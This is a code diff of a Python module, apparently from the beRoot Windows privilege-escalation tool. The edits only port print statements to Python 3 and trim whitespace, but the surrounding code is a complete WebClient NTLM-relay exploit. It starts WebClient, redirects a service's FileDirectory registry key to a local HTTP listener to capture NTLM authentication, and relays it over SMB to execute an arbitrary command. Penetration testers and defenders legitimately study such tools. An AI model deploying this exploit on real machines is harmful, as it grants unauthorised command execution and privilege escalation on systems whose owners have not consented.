@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from beroot.modules.objects.winstructures import *
 from httpserver import runHTTPServer
 from constant import constants
@@ -23,7 +24,7 @@ class GUID(Structure):
 		("Data2", WORD),
 		("Data3", WORD),
 		("Data4", BYTE * 8)
-	] 
+	]
 
 class EVENT_DESCRIPTOR(Structure):
 	_fields_ = [
@@ -31,8 +32,8 @@ class EVENT_DESCRIPTOR(Structure):
 		("Version", UCHAR),
 		("Channel", UCHAR),
 		("Level", 	UCHAR),
-		("Opcode", 	UCHAR), 
-		("Task", 	USHORT), 
+		("Opcode", 	UCHAR),
+		("Task", 	USHORT),
 		("Keyword", ULONGLONG)
 	]
 
@@ -47,13 +48,13 @@ class WebClient():
 		self.EventRegister 		= windll.advapi32.EventRegister
 		self.EventUnregister 	= windll.advapi32.EventUnregister
 		self.EventWrite 		= windll.advapi32.EventWrite
-		
+
 		self.timeout = 20
 
 	# check if the system has been hardenned enough to avoid this kind of privilege escalation
 	def isSMBHardened(self):
 		hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)
-		
+
 		smb_signature = 0
 		server_name_hardening = 0
 		try:
@@ -88,7 +89,7 @@ class WebClient():
 		guid.Data4[7] = c_byte(0xC7)
 
 
-		if self.EventRegister(byref(guid), None, None, byref(hReg)) == 0:	
+		if self.EventRegister(byref(guid), None, None, byref(hReg)) == 0:
 			event_desc = EVENT_DESCRIPTOR()
 			event_desc.Id 			= 1
 			event_desc.Version 		= 0
@@ -117,9 +118,9 @@ class WebClient():
 					isServiceRunning = self.isServiceRunning(svc)
 					if not isServiceRunning or (isServiceRunning and s.permissions['stop']):
 						triggers.append(s)
-						print '[+] Service %s found' % s.name
+						print('[+] Service {name} found'.format(name=s.name))
 					else:
-						print '[-] Service %s already running and could not be stopped' % s.name
+						print('[-] Service {name} already running and could not be stopped'.format(name=s.name))
 		_winreg.CloseKey(hkey)
 		return triggers
 
@@ -138,12 +139,12 @@ class WebClient():
 			status = int(ss.dwCurrentState.real)
 		else:
 			status = False
-		
+
 		if status == SERVICE_RUNNING:
 			isRunning = True
 
 		# wait that the service start correctly
-		if status == SERVICE_START_PENDING:	
+		if status == SERVICE_START_PENDING:
 			time.sleep(2)
 			isRunning = True
 
@@ -156,7 +157,7 @@ class WebClient():
 			return OpenService(hscm, name, access)
 		except:
 			return False
-		
+
 		lpcchBuffer 	= LPDWORD()
 		lpDisplayName 	= PCTSTR()
 		lpServiceName 	= PCTSTR()
@@ -194,72 +195,72 @@ class WebClient():
 			CloseServiceHandle(hscm)
 
 	def run(self, service, command):
-		print '[!] Checking WebClient vulnerability'
+		print('[!] Checking WebClient vulnerability')
 
 		if self.isSMBHardened():
-			print '[-] Not vulnerable, SMB is hardened'
+			print('[-] Not vulnerable, SMB is hardened')
 			return False
 
 		# check if webclient is already running
 		if not self.isServiceRunning('WebClient'):
 			# if not try to start it
 			if self.startWebclient():
-				
+
 				# check if service has been correctly started
 				if not self.isServiceRunning('WebClient'):
-					print '[-] WebClient could not be started'
+					print('[-] WebClient could not be started')
 					return False
 
-		print '[!] Find services used to trigger an NTLM hash'
+		print('[!] Find services used to trigger an NTLM hash')
 		triggers = self.find_services_trigger(service)
 		if not triggers:
-			print '[-] No service found'
+			print('[-] No service found')
 			return False
-		
+
 		else:
 			for trigger in triggers:
 				error = False
 				port = randint(8000, 9999)
 
 				# launch http server
-				print '[!] Setting up HTTP Server 127.0.0.1:%s' % port
-				print '[!] Command to execute: %s' % command
+				print('[!] Setting up HTTP Server 127.0.0.1:{port}'.format(port=port))
+				print('[!] Command to execute: {command}'.format(command=command))
 				runHTTPServer(port, service=trigger.name, command=command)
 
 				# check if the trigger service is already running
 				if self.isServiceRunning(trigger.name) and trigger.permissions['stop']:
 					# we should not have enought privilege to stop it but lets try to check a misconfiguration on this service
-					print '[!] Service %s is running, trying to stop it' % trigger.name
+					print('[!] Service {name} is running, trying to stop it'.format(name=trigger.name))
 					self.StopService(trigger.name)
-					
+
 					if self.isServiceRunning(trigger.name):
 						# service could not be used as trigger
-						print '[-] Enable to stop the sevice %s' % trigger.name
+						print('[-] Enable to stop the sevice {name}'.format(name=trigger.name))
 						continue
-					print '[+] Service %s has been stopped' % trigger.name
-				
+					print('[+] Service {name} has been stopped'.format(name=trigger.name))
+
 				# redirect FileDirectory regedit key to our listening server
 				self.modify_registry(trigger.name, fileDirectory='\\\\127.0.0.1@%s\\tracing' % port, enableFileTracing=1)
 
 				# launch service trigger
 				self.StartService(trigger.name)
 				if self.isServiceRunning(trigger.name):
-					print '[+] Service %s has been correctly started, waiting to get an hash' % trigger.name
+					print('[+] Service {name} has been correctly started, waiting to get an hash'.format(name=trigger.name))
 				else:
-					print '[-] Failed to start the service %s' % trigger.name
+					print('[-] Failed to start the service {name}'.format(name=trigger.name))
 					continue
 
 				start = time.time()
 				while not constants.outputCmd:
 					elapsed = time.time() - start
 					if elapsed > self.timeout and not constants.isRunning:
-						print '[-] Timeout reached. Exit'
+						print('[-] Timeout reached. Exit')
 						error = True
 						break
 
 				# clean up / restore value as origin
 				self.modify_registry(trigger.name)
-				
+
 				# success
 				if not error:
 					break
@@ -267,21 +268,21 @@ class WebClient():
 		ok = False
 		if constants.authentication_succeed == True:
 			try:
-				print '[!] Stopping the service %s' % trigger.name
-				executeCmd = doAttack(constants.smb_client, 'sc stop %s' % trigger.name)
+				print('[!] Stopping the service {name}'.format(name=trigger.name))
+				executeCmd = doAttack(constants.smb_client, 'sc stop {name}'.format(name=trigger.name))
 				executeCmd.run()
 				if not self.isServiceRunning(trigger.name):
-					print '[+] Service %s has been correctly stopped' % trigger.name
+					print('[+] Service {name} has been correctly stopped'.format(name=trigger.name))
 			except:
 				pass
 
-			print '[+] Authentication succeed: \n\n%s' % str(constants.outputCmd)
+			print('[+] Authentication succeed: \n\n{output}'.format(output=str(constants.outputCmd)))
 			ok = True
 
 		elif constants.authentication_succeed == False:
-			print '[-] Authentication failed; seems not vulnerable'
+			print('[-] Authentication failed; seems not vulnerable')
 
 		elif constants.authentication_succeed == None:
-			print '[?] The authentication process has not reached the end, try to check the standard output' 
+			print('[?] The authentication process has not reached the end, try to check the standard output')
 
 		return ok
